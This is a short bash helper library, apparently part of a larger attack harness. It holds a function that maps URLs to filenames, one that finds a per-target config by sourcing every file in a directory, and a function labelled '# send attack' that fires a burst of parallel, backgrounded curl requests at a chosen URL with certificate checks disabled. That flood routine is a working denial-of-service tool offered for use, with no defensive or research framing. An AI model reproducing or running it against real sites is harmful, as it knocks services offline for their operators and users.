
# share bash lib - source only

# convert url to a string to be used as filename
# usage: url2str "http://www.google.com"
function url2str 
{
  if [[ $# -ne 1 ]]; then 
    echo "Error: function needs exactly one argument"
    return 1
  fi 
  str=$(echo -n "$1"  | md5sum | awk '{print $1}')
  echo $str
  return 0
}


# find the proc file by sitename (fqdn)
# usage $0 <url> <proc dir>
# return 0 if found, 1 otherwise.
# if found, echo full proc path to stdout
function findprocbyurl 
{
  if [[ $# -ne 2 ]]; then
    echo "Error: function needs exactly two arguments"
    return 1
  fi

  url="$1"
  procdir="$2"

  found=1
  for fn in `ls -1 ${procdir}`; do 
    source ${procdir}/$fn
    if [[ "$targeturl" == "$url" ]]; then 
      echo "${procdir}/$fn"
      found=0
      break;
    fi
  done
  return $found
}


# send attack
function pumprequests
{
  if [[ $# -ne 2 ]]; then
    echo "Error: function needs exactly 2 arguments"
    echo "Usage: $0 <target url> <count>"
    return 1
  fi

  url=$1
  count=$2

  echo -n "===>Sending $count requests to $url<===: "

  for i in `seq 0 ${count}`; do  
    curl -L --insecure --silent --output /dev/null --show-error --connect-timeout 20 -X GET ${url} 2>&1 &
  done
  echo "done"
  return 0
}


